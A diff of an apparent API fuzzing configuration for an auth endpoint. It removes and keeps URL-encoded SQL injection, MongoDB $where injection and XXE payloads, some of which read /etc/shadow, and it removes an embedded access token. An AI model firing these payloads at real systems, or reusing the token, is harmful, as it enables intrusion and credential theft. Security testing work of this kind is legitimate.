@@ -6,36 +6,16 @@
           "/api/auth/guest/"
         ],
         "parameters" : [
-          "?access_token=pk.eyJ1IjoiaGV1LWlmZCIsImEiOiJja3JtODF3aHIwOTZ4Mm9ycXc0cW96NGdnIn0.",
           "execute"
         ],
         "payloads" : [
           "%3D%3D",
           "%3D",
           "%27",
-          "%27%20%2D%2D",
-          "%27%20%23",
-          "%27%20â",
-          "%27%2D%2D",
-          "%27%2F%2A",
           "%27%23",
           "%22%20%2D%2D",
           "%20or%201%3D1â",
-          "true%2C%20%24where%3A%20%271%20%3D%3D%201%27",
-          "%2C%20%24where%3A%20%271%20%3D%3D%201%27",
-          "%24where%3A%20%271%20%3D%3D%201%27",
-          "db%2Einjection%2Einsert%28{success%3A1}%29%3B",
-          "db%2Einjection%2Einsert%28{success%3A1}%29%3Breturn%201%3Bdb%2Estores%2EmapReduce%28function%28%29%20{%20{%20emit%281%2C1",
-          "||%201%3D%3D1",
-          "%27%20%26%26%20this%2Epassword%2Ematch%28%2F%2E%2A%2F%29%2F%2F%2B%2500",
-          "%27%20%26%26%20this%2Epasswordzz%2Ematch%28%2F%2E%2A%2F%29%2F%2F%2B%2500",
-          "%3Cusername%3E%27%20OR%201%3D1%2D%2D",
-          "%27OR%20%27%27%20%3D%20%27",
-          "select%20current%5Fsetting%28%27log%5Fstatement%27%29%3B",
-          "select%20current%5Fsetting%28%27password%5Fencryption%27%29%3B",
-          "%22%3C%3Fxml%20version%3D%22%221%2E0%22%22%20encoding%3D%22%22ISO%2D8859%2D1%22%22%3F%3E%3C%21DOCTYPE%20foo%20%5B%3C%21ELEMENT%20foo%20ANY%3E%3C%21ENTITY%20xxe%20SYSTEM%20%22%22file%3A%2F%2F%2F%2Fdev%2Frandom%22%22%3E%5D%3E%3Cfoo%3E%26xxe%3B%3C%2Ffoo%3E%22",
-          "%22%3C%3Fxml%20version%3D%22%221%2E0%22%22%20encoding%3D%22%22ISO%2D8859%2D1%22%22%3F%3E%3C%21DOCTYPE%20foo%20%5B%3C%21ELEMENT%20foo%20ANY%3E%3C%21ENTITY%20xxe%20SYSTEM%20%22%22file%3A%2F%2F%2F%2Fetc%2Fshadow%22%22%3E%5D%3E%3Cfoo%3E%26xxe%3B%3C%2Ffoo%3E%22",
-          "%22%3C%3Fxml%20version%3D%22%221%2E0%22%22%20encoding%3D%22%22ISO%2D8859%2D1%22%22%3F%3E%3Cfoo%3E%3C%21%5BCDATA%5B%27%20or%201%3D1%20or%20%27%27%3D%27%5D%5D%3E%3C%2Ffoo%3E%22"
+          "true%2C%20%24where%3A%20%271%20%3D%3D%201%27"
         ]
       }],
       "POST" : [{
@@ -43,36 +23,16 @@
           "/api/auth/guest/"
         ],
         "parameters" : [
-          "?access_token=pk.eyJ1IjoiaGV1LWlmZCIsImEiOiJja3JtODF3aHIwOTZ4Mm9ycXc0cW96NGdnIn0.",
           "execute"
         ],
         "payloads" : [
           "%3D%3D",
           "%3D",
           "%27",
-          "%27%20%2D%2D",
-          "%27%20%23",
-          "%27%20â",
-          "%27%2D%2D",
-          "%27%2F%2A",
           "%27%23",
           "%22%20%2D%2D",
           "%20or%201%3D1â",
-          "true%2C%20%24where%3A%20%271%20%3D%3D%201%27",
-          "%2C%20%24where%3A%20%271%20%3D%3D%201%27",
-          "%24where%3A%20%271%20%3D%3D%201%27",
-          "db%2Einjection%2Einsert%28{success%3A1}%29%3B",
-          "db%2Einjection%2Einsert%28{success%3A1}%29%3Breturn%201%3Bdb%2Estores%2EmapReduce%28function%28%29%20{%20{%20emit%281%2C1",
-          "||%201%3D%3D1",
-          "%27%20%26%26%20this%2Epassword%2Ematch%28%2F%2E%2A%2F%29%2F%2F%2B%2500",
-          "%27%20%26%26%20this%2Epasswordzz%2Ematch%28%2F%2E%2A%2F%29%2F%2F%2B%2500",
-          "%3Cusername%3E%27%20OR%201%3D1%2D%2D",
-          "%27OR%20%27%27%20%3D%20%27",
-          "select%20current%5Fsetting%28%27log%5Fstatement%27%29%3B",
-          "select%20current%5Fsetting%28%27password%5Fencryption%27%29%3B",
-          "%22%3C%3Fxml%20version%3D%22%221%2E0%22%22%20encoding%3D%22%22ISO%2D8859%2D1%22%22%3F%3E%3C%21DOCTYPE%20foo%20%5B%3C%21ELEMENT%20foo%20ANY%3E%3C%21ENTITY%20xxe%20SYSTEM%20%22%22file%3A%2F%2F%2F%2Fdev%2Frandom%22%22%3E%5D%3E%3Cfoo%3E%26xxe%3B%3C%2Ffoo%3E%22",
-          "%22%3C%3Fxml%20version%3D%22%221%2E0%22%22%20encoding%3D%22%22ISO%2D8859%2D1%22%22%3F%3E%3C%21DOCTYPE%20foo%20%5B%3C%21ELEMENT%20foo%20ANY%3E%3C%21ENTITY%20xxe%20SYSTEM%20%22%22file%3A%2F%2F%2F%2Fetc%2Fshadow%22%22%3E%5D%3E%3Cfoo%3E%26xxe%3B%3C%2Ffoo%3E%22",
-          "%22%3C%3Fxml%20version%3D%22%221%2E0%22%22%20encoding%3D%22%22ISO%2D8859%2D1%22%22%3F%3E%3Cfoo%3E%3C%21%5BCDATA%5B%27%20or%201%3D1%20or%20%27%27%3D%27%5D%5D%3E%3C%2Ffoo%3E%22"
+          "true%2C%20%24where%3A%20%271%20%3D%3D%201%27"
         ]
       }],
       "OPTIONS" : [{
@@ -80,36 +40,16 @@
           "/api/auth/guest/"
         ],
         "parameters" : [
-          "?access_token=pk.eyJ1IjoiaGV1LWlmZCIsImEiOiJja3JtODF3aHIwOTZ4Mm9ycXc0cW96NGdnIn0.",
           "execute"
         ],
         "payloads" : [
           "%3D%3D",
           "%3D",
           "%27",
-          "%27%20%2D%2D",
-          "%27%20%23",
-          "%27%20â",
-          "%27%2D%2D",
-          "%27%2F%2A",
           "%27%23",
           "%22%20%2D%2D",
           "%20or%201%3D1â",
-          "true%2C%20%24where%3A%20%271%20%3D%3D%201%27",
-          "%2C%20%24where%3A%20%271%20%3D%3D%201%27",
-          "%24where%3A%20%271%20%3D%3D%201%27",
-          "db%2Einjection%2Einsert%28{success%3A1}%29%3B",
-          "db%2Einjection%2Einsert%28{success%3A1}%29%3Breturn%201%3Bdb%2Estores%2EmapReduce%28function%28%29%20{%20{%20emit%281%2C1",
-          "||%201%3D%3D1",
-          "%27%20%26%26%20this%2Epassword%2Ematch%28%2F%2E%2A%2F%29%2F%2F%2B%2500",
-          "%27%20%26%26%20this%2Epasswordzz%2Ematch%28%2F%2E%2A%2F%29%2F%2F%2B%2500",
-          "%3Cusername%3E%27%20OR%201%3D1%2D%2D",
-          "%27OR%20%27%27%20%3D%20%27",
-          "select%20current%5Fsetting%28%27log%5Fstatement%27%29%3B",
-          "select%20current%5Fsetting%28%27password%5Fencryption%27%29%3B",
-          "%22%3C%3Fxml%20version%3D%22%221%2E0%22%22%20encoding%3D%22%22ISO%2D8859%2D1%22%22%3F%3E%3C%21DOCTYPE%20foo%20%5B%3C%21ELEMENT%20foo%20ANY%3E%3C%21ENTITY%20xxe%20SYSTEM%20%22%22file%3A%2F%2F%2F%2Fdev%2Frandom%22%22%3E%5D%3E%3Cfoo%3E%26xxe%3B%3C%2Ffoo%3E%22",
-          "%22%3C%3Fxml%20version%3D%22%221%2E0%22%22%20encoding%3D%22%22ISO%2D8859%2D1%22%22%3F%3E%3C%21DOCTYPE%20foo%20%5B%3C%21ELEMENT%20foo%20ANY%3E%3C%21ENTITY%20xxe%20SYSTEM%20%22%22file%3A%2F%2F%2F%2Fetc%2Fshadow%22%22%3E%5D%3E%3Cfoo%3E%26xxe%3B%3C%2Ffoo%3E%22",
-          "%22%3C%3Fxml%20version%3D%22%221%2E0%22%22%20encoding%3D%22%22ISO%2D8859%2D1%22%22%3F%3E%3Cfoo%3E%3C%21%5BCDATA%5B%27%20or%201%3D1%20or%20%27%27%3D%27%5D%5D%3E%3C%2Ffoo%3E%22"
+          "true%2C%20%24where%3A%20%271%20%3D%3D%201%27"
         ]
       }],
       "PATCH" : [{
@@ -117,36 +57,16 @@
           "/api/auth/guest/"
         ],
         "parameters" : [
-          "?access_token=pk.eyJ1IjoiaGV1LWlmZCIsImEiOiJja3JtODF3aHIwOTZ4Mm9ycXc0cW96NGdnIn0.",
           "execute"
         ],
         "payloads" : [
           "%3D%3D",
           "%3D",
           "%27",
-          "%27%20%2D%2D",
-          "%27%20%23",
-          "%27%20â",
-          "%27%2D%2D",
-          "%27%2F%2A",
           "%27%23",
           "%22%20%2D%2D",
           "%20or%201%3D1â",
-          "true%2C%20%24where%3A%20%271%20%3D%3D%201%27",
-          "%2C%20%24where%3A%20%271%20%3D%3D%201%27",
-          "%24where%3A%20%271%20%3D%3D%201%27",
-          "db%2Einjection%2Einsert%28{success%3A1}%29%3B",
-          "db%2Einjection%2Einsert%28{success%3A1}%29%3Breturn%201%3Bdb%2Estores%2EmapReduce%28function%28%29%20{%20{%20emit%281%2C1",
-          "||%201%3D%3D1",
-          "%27%20%26%26%20this%2Epassword%2Ematch%28%2F%2E%2A%2F%29%2F%2F%2B%2500",
-          "%27%20%26%26%20this%2Epasswordzz%2Ematch%28%2F%2E%2A%2F%29%2F%2F%2B%2500",
-          "%3Cusername%3E%27%20OR%201%3D1%2D%2D",
-          "%27OR%20%27%27%20%3D%20%27",
-          "select%20current%5Fsetting%28%27log%5Fstatement%27%29%3B",
-          "select%20current%5Fsetting%28%27password%5Fencryption%27%29%3B",
-          "%22%3C%3Fxml%20version%3D%22%221%2E0%22%22%20encoding%3D%22%22ISO%2D8859%2D1%22%22%3F%3E%3C%21DOCTYPE%20foo%20%5B%3C%21ELEMENT%20foo%20ANY%3E%3C%21ENTITY%20xxe%20SYSTEM%20%22%22file%3A%2F%2F%2F%2Fdev%2Frandom%22%22%3E%5D%3E%3Cfoo%3E%26xxe%3B%3C%2Ffoo%3E%22",
-          "%22%3C%3Fxml%20version%3D%22%221%2E0%22%22%20encoding%3D%22%22ISO%2D8859%2D1%22%22%3F%3E%3C%21DOCTYPE%20foo%20%5B%3C%21ELEMENT%20foo%20ANY%3E%3C%21ENTITY%20xxe%20SYSTEM%20%22%22file%3A%2F%2F%2F%2Fetc%2Fshadow%22%22%3E%5D%3E%3Cfoo%3E%26xxe%3B%3C%2Ffoo%3E%22",
-          "%22%3C%3Fxml%20version%3D%22%221%2E0%22%22%20encoding%3D%22%22ISO%2D8859%2D1%22%22%3F%3E%3Cfoo%3E%3C%21%5BCDATA%5B%27%20or%201%3D1%20or%20%27%27%3D%27%5D%5D%3E%3C%2Ffoo%3E%22"
+          "true%2C%20%24where%3A%20%271%20%3D%3D%201%27"
         ]
       }]
     }],
